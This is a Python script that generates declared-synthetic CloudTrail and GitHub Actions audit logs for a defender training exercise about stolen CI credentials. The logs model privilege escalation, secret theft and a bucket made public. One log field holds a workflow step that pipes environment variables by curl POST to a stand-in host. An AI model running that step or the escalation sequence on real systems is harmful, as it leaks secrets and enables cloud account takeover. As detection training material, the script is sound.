#!/usr/bin/env python3
"""
make_cloud_lab_data.py — SYNTHETIC evidence for GraySentinel RIU intel war-room
"Cloud Token Blackout" (CI/CD cloud-credential abuse).

Declared-synthetic lab data: AWS account 1111-2222-3333 is fictional, external IPs are
RFC-5737 (203.0.113.x), hosting ASN is a lab label, buckets/domains are example.* .
No real credentials or secrets. Rows model CloudTrail + GitHub Actions audit fields only.

Outputs:
  cloudtrail_SYNTHETIC.csv   CloudTrail-style events (identity, source IP, action, result)
  gh_audit_SYNTHETIC.csv     GitHub Actions / workflow audit events
"""
import csv, os
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
UTC = timezone.utc
CT_FIELDS = ["ts", "eventSource", "eventName", "principalType", "principal", "accessKeyId",
             "sourceIP", "userAgent", "mfa", "result", "resource", "detail"]
GH_FIELDS = ["ts", "action", "actor", "repo", "workflow", "runner", "sourceIP", "detail"]

CI_ROLE = "arn:aws:iam::111122223333:role/github-ci-deploy"
LONGKEY = "AKIAEXAMPLE7RUNNER01"          # long-lived key on a self-hosted runner (the weak point)
ATTACKER_IP = "203.0.113.77"
RUNNER_IP = "198.51.100.40"


def iso(dt): return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def ct(rows, dt, src, name, **kw):
    r = {k: "" for k in CT_FIELDS}
    r.update(ts=iso(dt), eventSource=src, eventName=name)
    r.update({k: str(v) for k, v in kw.items()}); rows.append(r)


def gh(rows, dt, action, **kw):
    r = {k: "" for k in GH_FIELDS}
    r.update(ts=iso(dt), action=action)
    r.update({k: str(v) for k, v in kw.items()}); rows.append(r)


def build_ct():
    rows = []
    base = datetime(2026, 9, 6, 2, 0, tzinfo=UTC)
    # 30-day baseline: CI assumes the deploy role via OIDC from GitHub ranges, short-lived
    for d in range(30):
        t = base + timedelta(days=d, minutes=(d * 13) % 50)
        ct(rows, t, "sts.amazonaws.com", "AssumeRoleWithWebIdentity", principalType="WebIdentity",
           principal=CI_ROLE, sourceIP="140.82.112.10", userAgent="aws-sdk-go/actions",
           mfa="n/a", result="Success", resource=CI_ROLE, detail="token.actions.githubusercontent.com (OIDC)")
        ct(rows, t + timedelta(minutes=2), "s3.amazonaws.com", "PutObject", principalType="AssumedRole",
           principal=CI_ROLE + "/ci-run", sourceIP="140.82.112.10", userAgent="aws-cli/deploy",
           result="Success", resource="arn:aws:s3:::example-app-artifacts")
    # --- Attack: 06 Oct 2026, long-lived key stolen from a runner, used from a hosting IP ---
    t = datetime(2026, 10, 6, 1, 20, tzinfo=UTC)
    ua = "Boto3/1.34 Python/3.11 (lab)"
    ct(rows, t, "sts.amazonaws.com", "GetCallerIdentity", principalType="IAMUser",
       principal="runner-deploy", accessKeyId=LONGKEY, sourceIP=ATTACKER_IP, userAgent=ua,
       mfa="false", result="Success", detail="first use of this key from this IP/ASN (hosting)")
    ct(rows, t + timedelta(minutes=1), "iam.amazonaws.com", "ListAttachedUserPolicies",
       principalType="IAMUser", principal="runner-deploy", accessKeyId=LONGKEY,
       sourceIP=ATTACKER_IP, userAgent=ua, result="Success", resource="user/runner-deploy")
    # privilege escalation: create a new access key + attach admin
    ct(rows, t + timedelta(minutes=2), "iam.amazonaws.com", "CreateAccessKey",
       principalType="IAMUser", principal="runner-deploy", accessKeyId=LONGKEY,
       sourceIP=ATTACKER_IP, userAgent=ua, result="Success", resource="user/runner-deploy",
       detail="new key AKIAEXAMPLEN3WKEY99 created")
    ct(rows, t + timedelta(minutes=3), "iam.amazonaws.com", "AttachUserPolicy",
       principalType="IAMUser", principal="runner-deploy", accessKeyId=LONGKEY,
       sourceIP=ATTACKER_IP, userAgent=ua, result="Success", resource="user/runner-deploy",
       detail="policy=arn:aws:iam::aws:policy/AdministratorAccess")
    # data access + secrets
    ct(rows, t + timedelta(minutes=5), "s3.amazonaws.com", "ListBuckets", principalType="IAMUser",
       principal="runner-deploy", accessKeyId=LONGKEY, sourceIP=ATTACKER_IP, userAgent=ua, result="Success")
    for i, b in enumerate(["example-prod-pii", "example-db-backups"]):
        ct(rows, t + timedelta(minutes=6, seconds=20 * i), "s3.amazonaws.com", "GetObject",
           principalType="IAMUser", principal="runner-deploy", accessKeyId=LONGKEY,
           sourceIP=ATTACKER_IP, userAgent=ua, result="Success", resource=f"arn:aws:s3:::{b}",
           detail="bucket never accessed by this principal before")
    ct(rows, t + timedelta(minutes=7), "secretsmanager.amazonaws.com", "GetSecretValue",
       principalType="IAMUser", principal="runner-deploy", accessKeyId=LONGKEY,
       sourceIP=ATTACKER_IP, userAgent=ua, result="Success", resource="prod/db/master")
    ct(rows, t + timedelta(minutes=8), "s3.amazonaws.com", "GetBucketPolicy", principalType="IAMUser",
       principal="runner-deploy", accessKeyId=LONGKEY, sourceIP=ATTACKER_IP, userAgent=ua, result="Success")
    # persistence: make a bucket public (exfil channel)
    ct(rows, t + timedelta(minutes=9), "s3.amazonaws.com", "PutBucketPolicy", principalType="IAMUser",
       principal="runner-deploy", accessKeyId=LONGKEY, sourceIP=ATTACKER_IP, userAgent=ua,
       result="Success", resource="arn:aws:s3:::example-prod-pii", detail="policy allows Principal:* GetObject")
    # a failed call (defender-visible noise)
    ct(rows, t + timedelta(minutes=10), "iam.amazonaws.com", "CreateUser", principalType="IAMUser",
       principal="runner-deploy", accessKeyId=LONGKEY, sourceIP=ATTACKER_IP, userAgent=ua,
       result="AccessDenied", resource="user/svc-backdoor")
    rows.sort(key=lambda r: r["ts"]); return rows


def build_gh():
    rows = []
    base = datetime(2026, 9, 6, 2, 0, tzinfo=UTC)
    for d in range(30):
        t = base + timedelta(days=d, minutes=(d * 13) % 50)
        if t.weekday() < 5:
            gh(rows, t, "workflows.completed", actor="dev.ravi", repo="example/app",
               workflow="deploy.yml", runner="self-hosted-01", sourceIP="198.51.100.40", detail="success")
    t = datetime(2026, 10, 6, 1, 5, tzinfo=UTC)
    # a workflow edited to echo env + a run triggered off-hours by a stale account
    gh(rows, t, "workflow.edited", actor="ex.contractor", repo="example/app", workflow="deploy.yml",
       runner="self-hosted-01", sourceIP=ATTACKER_IP, detail="added step: env | curl -X POST cdn-sync.example.net")
    gh(rows, t + timedelta(minutes=3), "workflow_run.triggered", actor="ex.contractor",
       repo="example/app", workflow="deploy.yml", runner="self-hosted-01", sourceIP=ATTACKER_IP,
       detail="off-hours; actor is a terminated contractor still referenced in automation")
    gh(rows, t + timedelta(minutes=6), "secret.retrieved", actor="ex.contractor", repo="example/app",
       workflow="deploy.yml", runner="self-hosted-01", sourceIP=ATTACKER_IP, detail="AWS_* env exposed to step")
    rows.sort(key=lambda r: r["ts"]); return rows


def main():
    with open(os.path.join(HERE, "cloudtrail_SYNTHETIC.csv"), "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=CT_FIELDS); w.writeheader(); w.writerows(build_ct())
    with open(os.path.join(HERE, "gh_audit_SYNTHETIC.csv"), "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=GH_FIELDS); w.writeheader(); w.writerows(build_gh())
    print("wrote cloudtrail_SYNTHETIC.csv + gh_audit_SYNTHETIC.csv")


if __name__ == "__main__":
    main()
